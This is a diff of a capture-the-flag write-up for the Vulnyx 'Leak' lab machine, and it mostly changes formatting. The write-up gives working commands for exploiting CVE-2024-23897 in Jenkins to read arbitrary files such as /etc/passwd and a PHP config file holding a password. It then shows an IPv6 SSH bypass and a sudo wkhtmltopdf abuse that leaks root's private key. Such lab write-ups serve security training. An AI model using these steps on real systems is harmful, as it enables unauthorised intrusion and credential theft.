@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Leak 
+---
+icon: linux
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Linux  
+# Leak ​​
+
+## 🖥️ Writeup - Leak
+
+**Platform:** Vulnyx\
+**Operating System:** Linux
 
 > **Tags:** `Linux` `Jenkins` `CVE-2024-23897` `Arbitrary File Read` `IPv6 Bypass` `Pspy64` `Sudoers` `Data Exfiltration`
 
-# INSTALLATION
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Leak machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Leak machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Leak, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,22 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:cc:8c:61      1      60  PCS Systemtechnik GmbH      
  10.0.4.36       08:00:27:49:c2:35      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 We identify with high confidence that the victim’s IP is `10.0.4.36`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.36
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80,8080 --min-rate 5000 10.0.4.36
 ```
+
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 20:02 CET
 Nmap scan report for 10.0.4.36
@@ -72,7 +82,7 @@ We identify open ports `80` and `8080`.
 
 We access the web service on port `80` and find a default `Apache2` page.
 
-# GOBUSTER
+## GOBUSTER
 
 We perform `directory fuzzing` to try to locate hidden directories or files.
 
@@ -81,6 +91,7 @@ gobuster dir -u http://10.0.4.36 -w /usr/share/seclists/Discovery/Web-Content/di
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -106,11 +117,11 @@ We discover a `connect.php` file, but navigating to it simply reveals a blank pa
 
 With no other initial leads, we access port `8080` and encounter a Jenkins instance:
 
-![alt text](../../images/jenkinsss.png)
+![alt text](../../.gitbook/assets/jenkinsss.png)
 
 We navigate to the People tab:
 
-![alt text](../../images/george.png)
+![alt text](../../.gitbook/assets/george.png)
 
 We identify a user named `george`.
 
@@ -120,7 +131,7 @@ In the bottom right corner of the dashboard, we can see the Jenkins version: `Je
 
 We search online for exploits related to this `Jenkins` version.
 
-# EXPLOIT
+## EXPLOIT
 
 We find a `CVE` associated with it that allows us to access files via the `CLI`.
 
@@ -128,13 +139,14 @@ We find a `CVE` associated with it that allows us to access files via the `CLI`.
 Jenkins Arbitrary File Read Through the CLI (CVE-2024-23897)
 ```
 
-![alt text](../../images/exploitcli.png)
+![alt text](../../.gitbook/assets/exploitcli.png)
 
 ```bash
 wget http://10.0.4.36:8080/jnlpJars/jenkins-cli.jar
 ```
 
 Info:
+
 ```
 --2025-12-16 20:55:25--  http://10.0.4.36:8080/jnlpJars/jenkins-cli.jar
 Connecting to 10.0.4.36:8080... connected.
@@ -154,6 +166,7 @@ java -jar jenkins-cli.jar -s http://10.0.4.36:8080/ -http connect-node "@/etc/pa
 ```
 
 Info:
+
 ```
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin" exists.
@@ -194,9 +207,10 @@ We attempt to read the content of the `connect.php` file found earlier on port `
 
 ```bash
 java -jar jenkins-cli.jar -s http://10.0.4.36:8080/ -http connect-node "@/var/www/html/connect.php"
-``` 
+```
 
 Info:
+
 ```
 : anonymous no tiene el permiso Nodo/Connect
 $password = "g30rg3_L3@k3D";: No such agent "$password = "g30rg3_L3@k3D";" exists.
@@ -210,9 +224,9 @@ ERROR: Error occurred while performing this command, see previous stderr output.
 
 We obtain credentials that likely belong to the user `george` : `g30rg3_L3@k3D`.
 
-We attempt to authenticate on the `Jenkins` login panel using these credentials. 
+We attempt to authenticate on the `Jenkins` login panel using these credentials.
 
-![alt text](../../images/Loginjenkins.png)
+![alt text](../../.gitbook/assets/Loginjenkins.png)
 
 However, we are unsuccessful.
 
@@ -223,6 +237,7 @@ java -jar jenkins-cli.jar -s http://10.0.4.36:8080/ -http connect-node "@/proc/n
 ```
 
 Info:
+
 ```
 00000000000000000000000000000001 01 80 10 80       lo: No such agent "00000000000000000000000000000001 01 80 10 80       lo" exists.
 fe800000000000000a0027fffe49c235 02 40 20 80   enp0s3: No such agent "fe800000000000000a0027fffe49c235 02 40 20 80   enp0s3" exists.
@@ -239,6 +254,7 @@ nmap -n -Pn -sS -p- --open --min-rate 5000 -6 fe80::a00:27ff:fe49:c235%eth1
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 21:12 CET
 Nmap scan report for fe80::a00:27ff:fe49:c235
@@ -262,6 +278,7 @@ ssh george@fe80::a00:27ff:fe49:c235%eth1
 ```
 
 Info:
+
 ```
 The authenticity of host 'fe80::a00:27ff:fe49:c235%eth1 (fe80::a00:27ff:fe49:c235%eth1)' can't be established.
 ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
@@ -277,7 +294,7 @@ george@leak:~$
 
 It works!
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
 We check for `sudo` privileges and `SUID` binaries.
 
@@ -286,6 +303,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for george on leak:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -308,6 +326,7 @@ chmod +x pspy64
 ```
 
 Info:
+
 ```
 2025/12/16 21:25:10 CMD: UID=0     PID=2      | 
 2025/12/16 21:25:10 CMD: UID=0     PID=1      | /sbin/init 
@@ -323,6 +342,7 @@ sudo /usr/bin/wkhtmltopdf /root/private.txt private.pdf
 ```
 
 Info:
+
 ```
 QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
 Loading page (1/2)
@@ -330,13 +350,14 @@ Printing pages (2/2)
 Done
 ```
 
-We transfer the generated `private.pdf` file to our attacking machine. From our machine, we execute: 
+We transfer the generated `private.pdf` file to our attacking machine. From our machine, we execute:
 
 ```bash
 scp -6 george@\[fe80::a00:27ff:fe49:c235%eth1\]:/tmp/private.pdf /home/trihack/
 ```
 
 Info:
+
 ```
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
@@ -347,7 +368,7 @@ private.pdf
 
 Once obtained, we proceed to view its content:
 
-![alt text](../../images/privatekeyroot.png)
+![alt text](../../.gitbook/assets/privatekeyroot.png)
 
 We identify it as an `SSH private key`, likely belonging to the `root` user.
 
@@ -358,13 +379,14 @@ nano privateroot
 chmod 600 privateroot
 ```
 
-Next, we attempt to authenticate as `root` via `SSH` using this `private key`. 
+Next, we attempt to authenticate as `root` via `SSH` using this `private key`.
 
 ```bash
 ssh -i privateroot root@fe80::a00:27ff:fe49:c235%eth1
 ```
 
 Info:
+
 ```
 root@leak:~# whoami
 root
@@ -374,6 +396,7 @@ root@leak:~#
 We are now root!
 
 Finally, we obtain the `user flag` and the `root flag`:
+
 ```
 root@leak:~# cat .r00000000000000t.txt 
 89c441988949961e48d5085c3d70c9f1
